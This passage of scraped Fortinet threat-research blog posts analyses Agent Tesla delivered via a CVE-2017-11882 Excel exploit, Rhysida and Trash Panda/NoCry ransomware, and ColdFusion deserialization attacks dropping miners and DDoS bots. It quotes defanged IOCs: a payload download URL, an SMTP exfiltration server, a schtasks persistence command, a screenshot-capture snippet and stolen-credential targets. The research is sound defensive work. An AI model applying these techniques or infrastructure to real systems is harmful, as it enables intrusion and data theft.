AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. The URLs are rated as “Malicious Websites” by theFortiGuard Web Filtering service. We also suggest our readers go through the freeNSE training: NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. bankslip[.]infosoftwarez[.]onlinenitrosoftwares[.]shop c9e72e2865517e8838dbad0ce41561b2bd75c399b7599c1711350f9408189b9b56ced4e1abca685a871b77fab998766cbddfb3edf719311316082b6e05986d67c204f07873fafdfd48f37e7e659e3be1e4202c8f62db8c00866c8af40a9a82c521ad235118c371e2850c539040b6dcdd88196c021245440155fe80aacf6ccc7e4617631b4497eddcbd97538f6712e06fabdb53af3181d6c1801247338bffaad3be915d601276635bf4e77ce6b84feeec254a900c0d0c229b0d00f2c0bca1bec7c241e3b5d389b227484a8baec303e6c3e262d7f7bf7909e36e312dea9fb82798dfd2b218387910b4aab6e5ee431acab864b255832eddd0fc7780db9d5844520af36464557efef14b7ee4cebadcc0e45af46f5c06b67c5351da15391b03a19c4cb15055e75ae0eeb4585f9323ef041fa25ed9b6bf2896b6ea45d871d49a1c72b849c969a5461b2919fd9a7dc7f76dd84101b2acc429b341f8eeee248998e9da3265e47578274d16be1be0f50767bad0af16930df43556dd23d7ad5e4adc2bcbe3 botnet,microsoft office FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/originbotnet-spreads-via-malicious-word-document"
  },
  {
    "title": "New Agent Tesla Variant Being Spread by Crafted Excel Document",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Collects sensitive information from a victim’s computerSeverity level:Critical Our FortiGuard Labs captured a phishing campaign that spreads a new Agent Tesla variant. This well-known malware family uses a .Net-based Remote Access Trojan (RAT) and data stealer to gain initial access. It is often used for Malware-as-a-Service (MaaS). I performed an in-depth analysis of this campaign, from the initial phishing email to the actions of Agent Tesla installed on the victim’s machine to the collecting of sensitive information from the affected device. In this analysis, you will learn about the contents of this attack, such as how the phishing email starts the campaign, how the CVE-2017-11882/CVE-2018-0802 vulnerability (and not the VBS macro) is exploited to download and execute the Agent Tesla file on the victim’s device, as well as how Agent Tesla collects the sensitive data from the victim’s device, such as the credentials, key loggings, and screenshots of the victim’s screen. Despite fixes forCVE-2017-11882/CVE-2018-0802being released by Microsoft in November, 2017 and January, 2018, this vulnerability remains popular amongst threat actors, suggesting there are still unpatched devices in the wild, even after over five years. We are observing and mitigating3000 attacks per day, at the IPS level. The number of observed vulnerable devices isaround 1300per day. The phishing email is disguised as a Purchase Order notification, shown in Figure 1.1, that asks for the recipient to confirm an order from an industrial equipment supplier company. An Excel document is attached to this email called “Order 45232429.xls”. The attached Excel document is in OLE format. It contains crafted equation data that exploits the CVE-2017-11882/CVE-2018-0802 vulnerability to execute a malicious shellcode. Opening the attached Excel document displays a deceptive message to the user (Figure 2.1). Meanwhile, the shellcode inside the crafted equation data is secretly executed. CVE-2017-11882/CVE-2018-0802 is an RCE (remote code execution) vulnerability that results in memory corruption inside the EQNEDT32.EXE process when parsing the crafted equation data when exploited. This can lead to arbitrary code execution. Figure 2.2 shows the Excel document parsed in an OLE compound reader, where the equation data is inside the stream “\\x01Ole10NativE” under the storage folder “MBD0057E612”. Once the crafted Excel document is opened, the malicious equation data is parsed automatically by an MS Office process called “EQNEDT32.EXE.” This triggers the CVE-2017-11882/CVE-2018-0802 vulnerability, and the malicious shellcode inside the equation data is executed in the background. In Figure 2.3, we can see that the crafted equation data overrides the stack of the EQNEDT32.EXE and makes it jump twice (through the fixed addresses of 0x450650 and 0x44C329) to the shellcode at 0x33C006C (in the stack). After self-decryption, we observe that the shellcode’s main job is downloading and executing an additional malware file from the URL “hxxp://23[.]95.128.195/3355/chromium.exe”. To do this, it calls several APIs, such as URLDownloadToFileW(), to download the malware to a local folder, and ShellExecuteW() to run the malware on the victim’s device. In Figure 2.4, we can see that the shellcode is about to call the API URLDownloadToFileW() to download it into a local file and rename it as “dasHost.exe” under the “%TEMP%” folder. The downloaded file (“dasHost.exe”) is a .Net program protected by two packers, IntelliLock and .NET Reactor. Figure 3.1 displays the EntryPoint function of the downloaded file inside dnSpy, where the assembly name of the file is “Nvgqn7x”. As you may have noticed, all the names of the namespaces, classes, methods, and variables are thoroughly obfuscated. There are resource files inside the downloaded file’s .Net Resources section. The downloaded file (“dasHost.exe”) extracts two fileless execution modules from the .Net Resources section. One is the payload module of Agent Tesla, and the other is a Loader module to the payload file of Agent Tesla. Figure 3.2 shows all the resources in the .Net Resources section. According to my analysis, the resource \"rTMIRNhcvIYnT8lMa6.UJQcCvWAsvT8GV6hyn.resources\" is the encoded Loader module, whose assembly name is “Cassa.” The resource \"FinalProject.Resources\" is the encrypted and compressed Agent Tesla payload module, whose assembly name is “NyZELH bX.” It gets decrypted, decompressed, and loaded as a module in the “DeleteMC()” function of the Loader module, as shown in Figure 3.3. As you may have noticed, the resource is disguised as a Bitmap resource and is mixed up with the payload. Bitmap.GetPixel() and Color.FromArgb() are the two APIs being called to read the payload from the resource. It then goes through decryption and gzip decompression to restore the payload file, which is loaded as an executable module by calling the AppDomain.CurrentDomain.Load() method. Finally, the payload file’s “EntryPoint” function is invoked from the Loader module (“Cassa”). The payload module is a .Net program and is fully obfuscated. Fortunately, I managed to have it de-obfuscated using several analysis tools. As with most malware, the developers run the malware’s core module in a separate process. This is a common protection strategy to increase the malware's chance of survival on the victim's device. The primary function (other than persistence) of the payload is to perform the process hollowing and then place another decrypted executable file—sourced from a separate resource (called “7gQsJ0ugxz.resources”) within the payload file—onto the hollowed process and execute it. In this analysis, I call this decrypted executable file the core module of Agent Tesla. Figure 4.1 contains the key APIs the payload module invokes to perform the ProcessHollowing. It invokes CreateProcess() to create a suspended process of “dasHost.exe.” Next, it allocates memory in this process via the API VirtualAllocEx() for the core module. Then WriteProcessMemory() is invoked numerous times to copy the core module, saved in the array variable byte_1, onto the new process. It finally calls the APIs SetThreadContext() and ResumeThread() to restore the new process from a suspended state to execute the core module of Agent Tesla. After that, the payload module exits by calling Environment.Exit() in the Loader module’s DeleteMC() (refer to Figure 3.3). To persist in collecting the victim’s sensitive data, even if the affected system is restarted or the Agent Tesla process is killed, it does the following two things. It executes a command to create a task in the system TaskScheuler inside the payload module. The command in my analysis environment is \"C:\\Windows\\System32\\schtasks.exe\" /Create /TN \"Updates\\kCqKCO\" /XML \"C:\\Users\\Bobs\\AppData\\Local\\Temp\\tmp68E9.tmp,\" where \"Updates\\kCqKCO\" is the task name and \"/XML\" specifies it’s been created from an XML file that is provided by following a parameter (i.e. tmp68E9.tmp). Figure 5.1 shows the details of the XML content, where the file “C:\\Users\\Bobs\\AppData\\Roaming\\kCqKCO.exe” is a duplication of the downloaded “dasHost.exe.” The task is set to start at the victim’s logon. The core module adds an auto-run item in the system registry“C:\\Users\\Bobs\\AppData\\Roaming\\sOFvE\\sOFvE.exe” (shown in Figure 5.2). It is another duplication of “dasHost.exe” that is launched automatically at system startup. The Agent Tesla core module collects sensitive information from the victim’s device. This information includes the saved credentials of some software, the victim’s keylogging information, and screenshots of the victim’s device. It steals saved credentials from specified software installed on the victim’s device, including web browsers, email clients, FTP clients and more. Based on their features, the affected software can be categorized as below: \"Opera Browser\", \"Yandex Browser\", \"Iridium Browser\", \"Chromium\", \"7Star\", \"Torch Browser\", \"Cool Novo\", \"Kometa\", \"Amigo\", \"Brave\", \"CentBrowser\", \"Chedot\", \"Orbitum\", \"Sputnik\", \"Comodo Dragon\", \"Vivaldi\", \"Citrio\", \"360 Browser\", \"Uran\", \"Liebao Browser\", \"Elements Browser\", \"Epic Privacy\", \"Coccoc\", \"Sleipnir 6\", \"QIP Surf\", \"Coowon\", \"Chrome\", \"Flock Browser\", \"QQ Browser\", \"IE/Edge\", \"Safari\", \"UC Browser\", \"Falkon Browser\". \"Outlook\", \"ClawsMail\", \"IncrediMail\", \"FoxMail\", \"eM Client\", \"Opera Mail\", \"PocoMail\", \"Windows Mail App\", \"Mailbird\", \"The Bat!\", \"Becky!\", \"Eudora\". \"Flash FXP\", \"WS_FTP\", \"FTPGetter\", \"SmartFTP\", \"FTP Navigator\", \"FileZilla\", \"CoreFTP\", \"FtpCommander\", \"WinSCP\". \"NordVPN\", \"Private Internet Access\", \"OpenVPN\", \"Discord\", \"Trillian\", \"Psi/Psi+\". \"Mysql Workbench\", \"\\Microsoft\\Credentials\\\", \"Internet Download Manager\", \"JDownloader\". Agent Tesla calls the API SetWindowsHookEx() to set a keyboard hook to monitor low-level input events. In Figure 6.2, the callback hook procedure “this.EiqpViCm9()” is called whenever the victim is typing on their device. Agent Tesla records the program title, time, and victim’s keyboard input contents into a local file “%Temp%/log.tmp” from time to time. It also has a method called by a Timer every 20 minutes to check the “log.tmp” file and submit its content via SMTP. In the core module, Agent Tesla sets another Timer with a 20-minute interval to call another Timer function. This Timer function checks for any activity on the device and determines whether to record the screenshot and submit it. To do this, it calls the API GetLastInputInfo() to retrieve the time of the last input event received by the system and then compare it with the current time. The following pseudo-code snippet illustrates how Agent Tesla captures a screenshot. bitmap = newBitmap(bounds.Width, Screen.PrimaryScreen.Bounds.Height);encoderParameters = new EncoderParameters(1);encoder = 25Tl1j7fiou.KIOsJnSv3(ImageFormat.Jpeg);EncoderParameter encoderParameter = newEncoderParameter(Encoder.Quality, (long)Convert.ToInt32(60L));encoderParameters.Param[0] = encoderParameter;graphics = Graphics.FromImage(bitmap);graphics.CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);bitmap.Save(memoryStream, encoder, encoderParameters); The “memoryStream” variable saves the screenshot in jpeg format. Agent Tesla provides multiple ways to submit the stolen data, such as using the HTTP POST method or as the body of an email over SMTP. This variant chooses to submit the data collected from the victim’s device over email SMTP protocol. The SMTP server address and port hardcoded in the variant are \"mail.daymon.cc\" and 587. Figure 7.1 shows the malware about to call the smtpClient.Send() function to submit credentials data. The email subject starts with the keyword “PW_” followed by the User name/Computer name for credentials data. The email body is formatted in HTML. It is shown in Figure 7.2 when parsing the email body as HTML in a browser. The email’s subject is “KL_{User name/Computer name},” where KL is short for keylogger, and the email body is the collected keylogging data. As displayed in Figure 7.3, the email body includes the records of my keystrokes typed in a Notepad titled “Untitled - Notepad.” The captured screenshot is kept in a variable and added as an email attachment when submitted to the attacker. Figure 7.4 shows it about to add screenshot data to the email as an attachment. The email subject format for ScreenShots is “SC_{User name/Computer name},” and the email body is just the basic information about the victim’s device. The following flowchart roughly describes the outline of the malicious campaign. This analysis shows that a malicious Excel document attached to a phishing email exploits an aging security vulnerability to execute a shellcode that downloads Agent Tesla. It keeps relevant modules encrypted and encoded in the Resource section to protect its core module from being analyzed. I then explained how this variant establishes persistence on the victim’s device. I also showed the kind of software and data Agent Tesla is able to steal from the infected device, including credentials, keylogging data, and active screenshots. Lastly, I provided several examples of the kind of sensitive data this variant of Agent Tesla obtained from my analysis environment and how this stolen sensitive data is submitted to the attacker via emails over SMTP protocol. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, and AntiVirus services as follows: The downloading URLs are rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiMail has recognized the phishing email as SPAM. FortiGuard Antivirus service detects the attached Excel document and the downloaded file with AV signatures “MSExcel/CVE_2017_11882.EQMA!exploit” and “MSIL/AgentTesla.BEDA!tr”. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious Equation data inside the Excel document. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Hxxp[:]//23[.]95.128.195/3355/chromium.exe SMTP server @ mail.daymon.cc:587 [Order 45232429.xls]FDC04DC72884F54A4E553B662F1F186697DAF14EF8A2DC367BC584D904C22638 [chromium.exe / dasHost.exe / downloaded file]36B17C4534E34B6B22728DB194292B504CF492EF8AE91F9DDA7702820EFCFC3A Agent Tesla FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/agent-tesla-variant-spread-by-crafted-excel-document"
  },
  {
    "title": "Ransomware Roundup - Rhysida",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Rhysida ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High Rhysida ransomware is a new ransomware group that uses aRansomware-as-a-Service (RaaS)model consisting of developers who create and provide ransomware, the infrastructure needed to operate it, and affiliates who execute attacks against victims. Its first ransomware sample was submitted to a public file scanning service in May 2023. On August 4, 2023, the Health Sector Cybersecurity Coordination Center (HC3)releaseda sector alert for the Rhysida ransomware. According to the HC3 alert, Rhysida threat actors rely on phishing attacks as an infection vector. The attackers also reportedly use Cobalt Strike for lateral movement within the victim's network and to deliver payloads. Cobalt Strike is advertised as an adversary emulation tool for information security professionals to evaluate network and system defenses. However, cybercriminals often abuse it to compromise networks and create persistent communication channels between the attacker and the victim. The leak site used by the Rhysida group to auction and expose victim data currently lists 41 victims. While Rhysida has hit organizations around the globe, more than 50% of affected organizations are located in Europe, with North America a distant second. Organizations in Asia Pacific (APAC), Latin America, the Middle East, and Africa were also affected. The education sector accounts for more than 30% of its victims—with one exception, all of the affected organizations in the education sector are located in Europe and North America—followed by manufacturing, government, and IT. According to information on the data leak site, the largest amount of data (1.6 TB) was stolen from a European government agency. After compromising the victim’s network, Rhysidia likely deploys Cobalt Strike to move laterally across the network and function as its command and control center. The ransomware finds and encrypts data using the ChaCha algorithm, adding a “.rhysida” extension to the affected files. Rhysida ransomware avoids encrypting files that have the following file extensions: It also avoids encrypting files in the following folders: One of the earlier Rhysida ransomware samples (SHA2: a864282fea5a536510ae86c77ce46f7827687783628e4f2ceb5bf2c41b8cd3c6) drops a ransom note in PDF titled “CriticalBreachDetected.pdf.” The ransom note has Rhysida’s TOR site address, which victims are asked to visit to contact the attacker. The sample claims to have been created on May 15, 2023. The attacker appears to have created a new variant (SHA2: 258ddd78655ac0587f64d7146e52549115b67465302c0cbd15a0cba746f05595) on May 17 that drops a ransom note with the same title. However, the threat actor has also included a couple of email addresses as an alternative means of contact, probably in case victims are unfamiliar with TOR. One of the Rhysida samples we examined replaced the desktop wallpaper with the same ransom message as the dropped PDF file. Even though our analysis revealed minor differences such as those mentioned above, all of the Rhysida ransomware samples that FortiGuard Labs have collected are marked as version 0.1. The Rhysida group also operates a data leak site on TOR for ransom negotiations and exposing data stolen from the victims. At the time of our investigation, the most recent victim was a US organization in the education sector. The threat actor had demanded a ransom of 10 Bitcoins (as of August 22, 2023, one Bitcoin is worth approximately $26,000 US). However, as shown in Figure 7, the threat actor may be willing to negotiate a ransom if the counteroffer is not insultingly low. The leaks site displays stolen data in a file tree format and provides a search function. Fortinet customers are already protected from these malware variants through AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the Rhysida ransomware samples with the following AV signature: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. File-based IOCs: SHA2 Malware a864282fea5a536510ae86c77ce46f7827687783628e4f2ceb5bf2c41b8cd3c6 Rhysida ransomware 67a78b39e760e3460a135a7e4fa096ab6ce6b013658103890c866d9401928ba5 d5c2f87033a5baeeb1b5b681f2c4a156ff1c05ccd1bfdaf6eae019fc4d5320ee 1a9c27e5be8c58da1c02fc4245a07831d5d431cdd1a91cd35d2dd0ad62da71cd 258ddd78655ac0587f64d7146e52549115b67465302c0cbd15a0cba746f05595 0bb0e1fcff8ccf54c6f9ecfd4bbb6757f6a25cb0e7a173d12cf0f402a3ae706f f6f74e05e24dd2e4e60e5fb50f73fc720ee826a43f2f0056e5b88724fa06fbab 3d2013c2ba0aa1c0475cab186ddf3d9005133fe5f88b5d8604b46673b96a40d8 2c5d3fea7ad3c9c49e9c1a154370229c86c48fbaf7044213fd85d31efcebf7f6 3518195c256aa940c607f8534c91b5a9cd453c7417810de3cd4d262e2906d24f Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). threat research,Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-rhysida"
  },
  {
    "title": "Multiple Threats Target Adobe ColdFusion Vulnerabilities",
    "content": "FortiGuard Labs Threat Research Affected platforms:Windows and macOSImpacted parties:Users of vulnerable versions of Adobe ColdFusionImpact:Remote attackers gain control of vulnerable systemsSeverity level:Critical This past July, Adobe responded to reports of exploits targeting pre-authentication remote code execution (RCE) vulnerabilities in their ColdFusion solution by releasing a series of security updates:APSB23-40,APSB23-41, andAPSB23-47. An in-depthanalysisof those exploits has been documented by Project Discovery, including a significant vulnerability in the WDDX deserialization process within Adobe ColdFusion 2021. Since those updates, however, FortiGuard Labs IPS telemetry data has continued to detect numerous efforts to exploit the Adobe ColdFusion deserialization of untrusted data vulnerability, which poses a significant risk of arbitrary code execution (Figure 1). These attacks include probing, establishing reverse shells, and deploying malware for subsequent actions. This article provides a detailed analysis of how this threat group exploits the Adobe ColdFusion vulnerability. The targeted URI of the attack is “/CFIDE/adminapi/accessmanager.cfc,” which serves as a legitimate ColdFusion Component (CFC) endpoint. Attackers attempt to inject their payload into the “argumentCollection“ parameter through a POST request. A thorough packet capture illustrating this process is depicted in Figure 2. In July, we detected numerous active probing activities related to aninteractshtool that can generate specific domain names to help researchers test whether an exploit is successful (Figure 3). However, attackers can also use it to validate vulnerabilities via monitoring the domain. We collected the following domains related to similar probing activity, shown in Figure 4, including mooo-ng[.]com, redteam[.]tf, and h4ck4fun[.]xyz. Our analysis showed attackers are using a reverse shell, often called a remote shell or \"connect-back shell,\" to attempt to exploit vulnerabilities within a target system by initiating a shell session, thereby enabling access to the victim’s computer. Some exploits directed at the Adobe ColdFusion vulnerability use payloads encoded in Base64. The original data can be seen in Figure 5, while the decoded data is presented in Figure 6. Based on the data we’ve gathered, the attacks originate from multiple distinct IP addresses, including 81[.]68[.]214[.]122, 81[.]68[.]197[.]3 and 82[.]156[.]147[.]183. These payloads are also encoded in Base64 (Figure 7). We also observed that the threat actor distributed this malware from the same server 103[.]255[.]177[.]55[:]6895, as revealed by the decoded information in Figure 8. The server (103[.]255[.]177[.]55[:]6895) is a publicly accessible HTTP file server and we can observe the campaign’s progress through it. During our analysis, certain files proved especially challenging to trace due to frequent updates made by the attacker. The modifications to the files on the HFS public server are shown in Figure 9, showcasing the alterations made on 8/24. We also identified four malware variants being used in these attacks. The first entity is XMRig Miner, software that leverages computer processing cycles to mine for the Monero cryptocurrency. It can be used for legitimate mining or be abused by cybercriminals by hijacking CPU cycles. This attack uses version 6.20.0, shown in Figure 10. The second entity is Satan DDoS/Lucifer, a hybrid bot that combines cryptojacking and distributed denial of service (DDoS) functionalities. Lucifer was first reported in 2020. Beyond deploying the XMRig miner in this case, it demonstrates adeptness in command and control (C2) operations and can propagate by exploiting numerous vulnerabilities and employing credential brute-forcing. It also supports TCP, UDP, and HTTP-based DDoS attacks. Researchers initially identified Lucifer as targeting and operating on Windows-based systems, but from the welcome message in Figure 11, we can see that this variant targets Linux. Lucifer establishes persistence by configuring registry key values under “\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.” It also employs “schtasks” to initialize its miner parameter and create a recurring task for persistence, as shown in Figure 12. The third entity is known as RudeMiner. This isn’t the first instance of its association with Lucifer. As shown in the wallet information labeled “45sep79asuwcjz8dltu7xtjbtx7yyf7uo6qt9ymfbqxv8gJzsdpyd46hoh6dm8paxklnsw9u7vezwu1dqmjkroryan3zeq1” in Figure 13, this particular campaign can be traced back to 2020. Figure 14 illustrates the presence of the DDoS attack methods associated with RudeMiner. The last entity is the BillGates/Setag backdoor, known for hijacking systems, communicating with C2 servers, and initiating attacks. FortiGuard Labs previouslyreportedon its leveraging a vulnerability on Confluence Servers in 2021. It can be identified via the checking process procedure with the file “bill.lock” shown in Figure 15. The malware’s DDoS attack capabilities, as seen in Figure 16, encompass methods such as SYN, UDP, ICMP, and HTTP-based attacks. We have been tracking this vulnerability for weeks and have observed a significant volume of threat exploitation targeting Adobe ColdFusion. Although the patches for these vulnerabilities have already been released, public attacks are still occurring. We strongly urge users to upgrade affected systems immediately and apply FortiGuard protection to avoid threat probing. This malware is detected and blocked by FortiGuard Antivirus as: ELF/DDoS.BD!trW32/CoinMiner.OHX!wormELF/CoinMiner.HF!trELF/RudeMiner.TGW!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. FortiGuard Labs provides the following IPS signature against attacks exploiting the vulnerability discussed in this report: Adobe.ColdFusion.CVE-2023-38204.Insecure.DeserializationAdobe.ColdFusion.CVE-2023-38203.Insecure.DeserializationAdobe.ColdFusion.CVE-2023-29300.Insecure.Deserialization The FortiGuard Web Filtering Service blocks the attacker’s server. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. 81[.]68[.]214[.]12281[.]68[.]197[.]382[.]156[.]147[.]183 103[.]255[.]177[.]55:6895 7c6f0bae1e588821bd5d66cd98f52b7005e054279748c2c851647097fa2ae2df590d3088ed566cb3d85d48f4914cc657ee49b7d33e85c72167e7c72d81d4cb6c808f0f85aee6be3d3f3dd4bb827f556401c4d69a642ba4b1cb3645368954622e4f22fea4d0fadd2e01139021f98f04d3cae678e6526feb61fa8a6eceda13296a adobe FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/multiple-threats-target-adobe-coldfusion-vulnerabilities"
  },
  {
    "title": "Ransomware Roundup – Trash Panda and A New Minor Variant of NoCry",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers Trash Panda and a new minor variant of the NoCry ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High Trash Panda is a ransomware that runs on the Windows platform that was first spotted in early August. It encrypts files on compromised machines, replaces the desktop wallpaper, and drops a ransom note that includes politically themed messages. Information about the infection vector used by the Trash Panda ransomware threat actor is not currently available. However, it is unlikely to be significantly different from other ransomware groups. Trash Panda ransomware samples have been submitted to a public file scanning service from the following countries: Once the Trash Panda ransomware is executed, it launches a Command Prompt that clearly states that it’s encrypting files. It encrypts files on the compromised machineexceptfor files with the following file extensions: .diagcab, .cpl, .mod, .bat, .nls, .ldf, .dll, .ps1, .adv, .prf .idx,.rtp, .ocx, .icl, .ani, .cab, .rom, .key, .wpx, .icns, .themepack, .msc, .msp, .cur, .theme, .cmd, .diagpkg, .lnk, .ico, .drv, .bin, .nomedia, .lock, .mpa, .hlp, .scr, .shs, .com, .ics, .hta, .msi, .exe, .diagcfg, .msu, .deskthe, .mepack, .386, .msstyles, .spl, .sys The ransomware adds a “.monochromebear” extension to the files it encrypts. While no definitive conclusion can be made, the following message included in the ransom note provides a clue as to the possible origin of the Trash Panda ransomware and the country it targets: The ransomware also replaces the desktop wallpaper, which asks victims to check the dropped readme file. NoCry is a ransomware designed for the Windows platform that was first discovered in April 2021. NoCry ransomware variants are generated by NoCry ransomware builders and sold on the group’s Telegram channel. It appears that this NoCry ransomware variant was hosted on a website with a URL containing the name of a private bank in India as a string ([bank’s name]-india[.]github[.]io/Start[.]exe), so we believe that the threat actor used the bank as bait or to make the file look legitimate. The NoCry ransomware variant was submitted to a public file scanning service from the following locations: Once executed, this NoCry ransomware variant encrypts files on the compromised machines, adds a \".rcry\" extension to the encrypted files, and displays a ransom note. An interesting aspect of this ransomware is that it specifies USDT-TRC20 as the ransom payment. USDT-TRC20 is a stablecoin issued by Tether on the TRON network. It is pegged to the U.S. dollar and designed so that one USDT is approximately equal to one USD. The Bitly link in the ransom note leads to a Web page of a purported cybersecurity company based in California that offers services such as data encryption, malware removal, and firewalls with pricing plans. The Web site was created using a website builder called “Pineapple Builder.” The Pineapple badge at the bottom right of the Web site indicates that it was created using the free version. To use the services offered by this company, users must pay the fee in the same cryptocurrency to the same address specified by this ransomware. While we cannot say with certainty, it seems likely that the ransomware threat actor fabricated this company or website to collect additional money from users. This also indicates that the group uses multiple traps to increase the financial success of their attack. According to Tronscan (tronscan[.]org), the attacker’s wallet has received a few transactions. Since all incoming transactions have been less than 50 USDT, however, it's safe to assume that neither the NoCry ransomware variant nor the related fake service had successfully victimized anyone at the time of writing. The ransomware also drops a separate ransom note in an HTML file labeled “How to Decrypt My Files.html.” Fortinet customers are already protected from these malware variants through AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the Trash Panda ransomware sample with the following AV signature: FortiGuard Labs detects the NoCry ransomware variant with the following AV signature: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. The FortiGuard Web Filtering Service blocks the NoCry ransomware distribution site and the associated potential scam site. File-based IOCs: SHA2 Malware ce5cf3b964e636d546bf2c52423296bda06b7fe47e6f8a757f165a3be93c88db Trash Panda ransomware 521357a0f9669de4a9233feeef7a3c5299c51de4a2531c56aacc807c0fd25a6a A minor variant of NoCry ransomware Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aU.S. Department of 